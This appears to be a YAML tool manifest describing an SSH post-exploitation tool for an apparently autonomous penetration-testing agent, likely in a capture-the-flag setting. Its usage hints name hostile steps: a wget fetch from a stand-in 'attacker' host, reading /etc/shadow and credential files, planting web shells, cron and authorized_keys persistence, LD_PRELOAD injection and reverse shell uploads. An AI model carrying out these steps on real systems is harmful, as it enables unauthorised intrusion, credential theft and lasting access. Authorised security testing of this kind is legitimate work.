name: ssh
version: "1.0"
description: "SSH client (OpenSSH 10.2p1 + sshpass 1.10) for remote command execution, file transfer, and script deployment on compromised hosts. 7 methods: exec (single command with retry), shell (sequential commands joined with &&), copy_from/copy_to (SCP text file transfer), upload_binary (base64 chunked binary upload), run_script (upload+execute+cleanup), and background (nohup/disown detached process with env var injection). Supports password auth (via sshpass), PEM private keys, and OpenSSH-format keys (auto-converted to PEM). Auto-retry on transient failures (timeout, connection reset) with exponential backoff. Classified error messages for connection refused, permission denied, timeout, no route. Accepts arbitrary ssh_options for legacy ciphers, KEX algorithms, and MTU workarounds."
image: "ghcr.io/silicon-works/mcp-tools-ssh:latest"
image_size_mb: 100

capabilities:
  - remote_shell_access
  - command_execution
  - file_transfer
  - credential_based_access

phases:
  - exploitation
  - post-exploitation

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 128
  cpu: 0.25

# Routing hints for tool selection
routing:
  use_for:
    - "execute commands on a compromised host via SSH"
    - "upload exploits or tools to target via SCP"
    - "download files from compromised target via SCP"
    - "run enumeration scripts on remote host via SSH"
    - "SSH access with discovered credentials or private keys"
    - "start persistent background process on target"
    - "upload compiled binary exploit to target"
    - "environment variable injection for privilege escalation via SSH"
  never_use_for:
    - "SSH brute-force (use hydra)"
    - "port scanning"
    - "initial SSH connection test"
  triggers:
    - "SSH"
    - "SCP"
    - "remote command"
    - "remote shell"
    - "ssh exec"
    - "ssh key"
    - "upload to target"
    - "download from target"

methods:
  exec:
    description: "Execute a single command on a remote host via SSH. Uses sshpass for password auth or temp key file for key auth. OpenSSH-format keys are auto-converted to PEM via ssh-keygen. Includes automatic retry (up to 2 retries) on transient failures (connection timeout, reset, network unreachable) with exponential backoff. SSH warnings (host key, 'Permanently added') are filtered from stderr. Returns classified error messages on failure (connection refused, permission denied, timeout, no route to host)."
    when_to_use: "The primary method for running commands on a host after gaining SSH credentials. Use for: (1) Post-exploitation enumeration — run 'id', 'whoami', 'uname -a', 'cat /etc/passwd', (2) Checking sudo permissions — 'sudo -l', (3) Searching for flags or sensitive files — 'find / -name user.txt 2>/dev/null', (4) Running single recon commands before uploading full scripts. For multiple sequential commands, use shell instead. For multi-line scripts, use run_script. For persistent processes, use background."
    params:
      host:
        type: string
        required: true
        description: "Target hostname or IP address."
      username:
        type: string
        required: true
        description: "SSH username (e.g., 'root', 'www-data', discovered user)."
      password:
        type: string
        description: "SSH password. Uses sshpass for non-interactive password auth. Provide either password or key, not both."
      key:
        type: string
        description: "Private key content as string (PEM or OpenSSH format). OpenSSH keys ('BEGIN OPENSSH PRIVATE KEY') are auto-converted to PEM format. Written to temp file with 0600 permissions, deleted after use."
      command:
        type: string
        required: true
        description: "Shell command to execute on the remote host."
      port:
        type: integer
        default: 22
        description: "SSH port. Change for non-standard SSH ports discovered by nmap."
      timeout:
        type: integer
        default: 30
        description: "Total timeout in seconds for connection + command execution. Increase for slow commands or high-latency targets."
      ssh_options:
        type: string
        description: "Additional SSH options as a single string, parsed via shlex. Examples: '-o KexAlgorithms=diffie-hellman-group14-sha256' for legacy servers, '-o Ciphers=aes256-cbc' for old SSH versions, '-o StrictHostKeyChecking=no' (already set by default)."
    returns:
      exit_code:
        type: integer
        description: "Command exit code (0=success, non-zero=failure, 255=SSH connection error)."
      stdout:
        type: string
        description: "Command standard output."
      stderr:
        type: string
        description: "Command standard error (SSH warnings filtered out)."

  shell:
    description: "Execute multiple commands in sequence on a remote host. Commands are joined with '&&' (each command must succeed for the next to run) and sent as a single SSH exec. Uses the same retry and error handling as exec. Returns combined stdout from all commands."
    when_to_use: "When you need to run several related commands in order, such as: (1) Post-exploitation info gathering — ['id', 'whoami', 'cat /etc/os-release', 'uname -a'], (2) File system exploration — ['ls -la /home', 'ls -la /var/www', 'ls -la /opt'], (3) Setup steps — ['mkdir -p /tmp/.work', 'cd /tmp/.work', 'wget http://attacker/tool']. Commands are joined with &&, so if any command fails the chain stops. For independent commands that should all run regardless, use exec with ';' separator instead."
    params:
      host:
        type: string
        required: true
        description: "Target hostname or IP address."
      username:
        type: string
        required: true
        description: "SSH username."
      password:
        type: string
        description: "SSH password."
      key:
        type: string
        description: "Private key content (PEM or OpenSSH format, auto-converted)."
      commands:
        type: array
        required: true
        description: "List of commands to execute in order. Joined with '&&' — chain stops on first failure."
      port:
        type: integer
        default: 22
        description: "SSH port."
      timeout:
        type: integer
        default: 60
        description: "Total timeout for the entire command chain."
      ssh_options:
        type: string
        description: "Additional SSH options string."
    returns:
      exit_code:
        type: integer
        description: "Exit code of the last executed command in the chain."
      stdout:
        type: string
        description: "Combined stdout from all commands."

  copy_from:
    description: "Download a text file from a remote host via SCP. Transfers the file to a local temp file, reads the content as text (with error replacement for binary bytes), and returns the content as a string. For binary files, use exec with 'base64 <file>' and decode locally instead."
    when_to_use: "To retrieve text files from a compromised target: (1) Configuration files — /etc/passwd, /etc/shadow, ssh keys from ~/.ssh/, (2) Application configs — database credentials, .env files, wp-config.php, (3) Flags — user.txt, root.txt, (4) Log files — /var/log/auth.log, application logs, (5) Source code for analysis. Returns file content as a string. Not suitable for large binary files — use exec with base64 encoding for those."
    params:
      host:
        type: string
        required: true
        description: "Target hostname or IP address."
      username:
        type: string
        required: true
        description: "SSH username."
      password:
        type: string
        description: "SSH password."
      key:
        type: string
        description: "Private key content (PEM or OpenSSH format, auto-converted)."
      remote_path:
        type: string
        required: true
        description: "Absolute path to the file on the remote host (e.g., '/etc/shadow', '/home/user/user.txt')."
      port:
        type: integer
        default: 22
        description: "SSH port."
      timeout:
        type: integer
        default: 60
        description: "Transfer timeout in seconds."
      ssh_options:
        type: string
        description: "Additional SSH options string."
    returns:
      content:
        type: string
        description: "File contents as text."
      size:
        type: integer
        description: "File size in bytes."

  copy_to:
    description: "Upload text content to a remote host via SCP. Writes content to a local temp file, transfers via scp to the remote path. For text-based uploads: scripts, configs, web shells, cron entries. For binary uploads, use upload_binary instead."
    when_to_use: "To upload text content to a compromised target: (1) Upload enumeration scripts (linpeas.sh, linenum.sh) for privilege escalation, (2) Plant web shells in web-accessible directories, (3) Upload SSH authorized_keys for persistent access, (4) Write cron entries for persistence, (5) Upload configuration files for tool setup. For binary files (compiled exploits, ELF binaries), use upload_binary instead."
    params:
      host:
        type: string
        required: true
        description: "Target hostname or IP address."
      username:
        type: string
        required: true
        description: "SSH username."
      password:
        type: string
        description: "SSH password."
      key:
        type: string
        description: "Private key content (PEM or OpenSSH format, auto-converted)."
      content:
        type: string
        required: true
        description: "Text content to upload (scripts, configs, web shells, etc.)."
      remote_path:
        type: string
        required: true
        description: "Destination path on remote host (e.g., '/tmp/linpeas.sh', '/var/www/html/shell.php')."
      port:
        type: integer
        default: 22
        description: "SSH port."
      timeout:
        type: integer
        default: 60
        description: "Transfer timeout in seconds."
      ssh_options:
        type: string
        description: "Additional SSH options string."
    returns:
      size:
        type: integer
        description: "Uploaded content size in bytes."

  upload_binary:
    description: "Upload a binary file to a remote host via base64 chunked transfer over SSH. Splits the binary into 50KB chunks, base64-encodes each chunk, and appends to the remote file via 'echo <chunk> | base64 -d >> <path>'. Optionally makes the file executable (chmod +x, default true). Verifies upload with 'ls -la' and 'file' commands. Requires base64 on the remote host (present on virtually all Linux systems)."
    when_to_use: "To upload compiled exploits, ELF binaries, or other non-text files to a compromised target. Common uses: (1) Upload a compiled C exploit (kernel exploit, SUID exploit) built locally or via exploit-runner, (2) Upload a statically-compiled tool (nmap, socat, chisel) for pivoting, (3) Upload a reverse shell binary, (4) Upload pspy for process monitoring. The chunking approach works even when SCP is blocked but SSH exec works. For text files (scripts, configs), use copy_to instead — it's simpler."
    params:
      host:
        type: string
        required: true
        description: "Target hostname or IP address."
      username:
        type: string
        required: true
        description: "SSH username."
      password:
        type: string
        description: "SSH password."
      key:
        type: string
        description: "Private key content (PEM or OpenSSH format, auto-converted)."
      content_base64:
        type: string
        required: true
        description: "Binary file content as base64-encoded string."
      remote_path:
        type: string
        required: true
        description: "Destination path on remote host (e.g., '/tmp/exploit', '/dev/shm/chisel')."
      executable:
        type: boolean
        default: true
        description: "Run chmod +x on the file after upload. Default true."
      chunk_size:
        type: integer
        default: 50000
        description: "Chunk size for transfer in bytes (before base64 encoding)."
      port:
        type: integer
        default: 22
        description: "SSH port."
      timeout:
        type: integer
        default: 300
        description: "Total timeout for all chunks. 300s default handles multi-MB files."
      ssh_options:
        type: string
        description: "Additional SSH options string."
    returns:
      size:
        type: integer
        description: "Total uploaded file size in bytes."
      chunks:
        type: integer
        description: "Number of chunks transferred."
      verified:
        type: boolean
        description: "Whether upload was verified via ls and file commands."

  run_script:
    description: "Upload a script to /tmp on the remote host via SCP, make it executable, execute it with the specified interpreter, and delete the temp file afterward. Combines copy_to + exec in one call. Script runs with the SSH user's permissions. Returns stdout, stderr, and exit code."
    when_to_use: "For running multi-line scripts that are too complex for exec or shell. Common uses: (1) Run custom enumeration scripts — check for SUID binaries, writable directories, cron jobs, (2) Run linpeas.sh or linenum.sh content directly (paste script content, no need to wget), (3) Execute multi-step privilege escalation chains, (4) Run Python scripts on the target for exploitation. Use interpreter='/usr/bin/python3' for Python scripts, '/bin/sh' for POSIX-compatible scripts."
    params:
      host:
        type: string
        required: true
        description: "Target hostname or IP address."
      username:
        type: string
        required: true
        description: "SSH username."
      password:
        type: string
        description: "SSH password."
      key:
        type: string
        description: "Private key content (PEM or OpenSSH format, auto-converted)."
      script:
        type: string
        required: true
        description: "Full script content to upload and execute."
      interpreter:
        type: string
        default: "/bin/bash"
        description: "Script interpreter path. Common: '/bin/bash', '/bin/sh', '/usr/bin/python3', '/usr/bin/perl'."
      port:
        type: integer
        default: 22
        description: "SSH port."
      timeout:
        type: integer
        default: 120
        description: "Execution timeout in seconds."
      ssh_options:
        type: string
        description: "Additional SSH options string."
    returns:
      exit_code:
        type: integer
        description: "Script exit code."
      stdout:
        type: string
        description: "Script standard output."
      stderr:
        type: string
        description: "Script standard error."

  background:
    description: "Execute a detached background process on a remote host that survives SSH session disconnect. Uses nohup + disown to ensure persistence. Supports environment variable injection (exported before the command), output file capture, PID file writing, and a check command for verifying the process later. Environment variables are exported via 'export KEY=VALUE && ...' prefix."
    when_to_use: "For processes that must persist after the SSH connection ends. Key use cases: (1) LD_PRELOAD or PYTHONPATH injection exploits — set env={'LD_PRELOAD': '/tmp/evil.so'} and run a SUID binary, (2) Race condition exploits — start a persistent process while racing in another SSH session, (3) Start a reverse shell listener or file watcher on the target, (4) Run long-running enumeration (pspy, tcpdump) with output capture. Use pid_file to track the process and return_check_command=true to get a 'ps -p <pid>' command for later status checks."
    params:
      host:
        type: string
        required: true
        description: "Target hostname or IP address."
      username:
        type: string
        required: true
        description: "SSH username."
      command:
        type: string
        required: true
        description: "Command to run in the background. Wrapped in 'nohup bash -c \"...\" & disown'."
      password:
        type: string
        description: "SSH password."
      key:
        type: string
        description: "Private key content (PEM or OpenSSH format, auto-converted)."
      port:
        type: integer
        default: 22
        description: "SSH port."
      env:
        type: object
        description: "Environment variables to export before running the command. Each key-value pair becomes 'export KEY=VALUE'. Use for LD_PRELOAD, PYTHONPATH, PATH manipulation exploits."
      output_file:
        type: string
        description: "Remote file path to capture stdout/stderr. Without this, output goes to /dev/null."
      pid_file:
        type: string
        description: "Remote file path to write the process PID. Enables later process management (kill, status check)."
      return_check_command:
        type: boolean
        default: false
        description: "If true, returns a 'ps -p <pid>' command string for verifying the process is still running."
      ssh_options:
        type: string
        description: "Additional SSH options string."
    returns:
      success:
        type: boolean
        description: "Whether the background process was started successfully."
      pid:
        type: string
        description: "Process ID (only if pid_file was specified)."
      output_file:
        type: string
        description: "Path to the output capture file."
      check_command:
        type: string
        description: "Command to verify process status (only if return_check_command=true)."
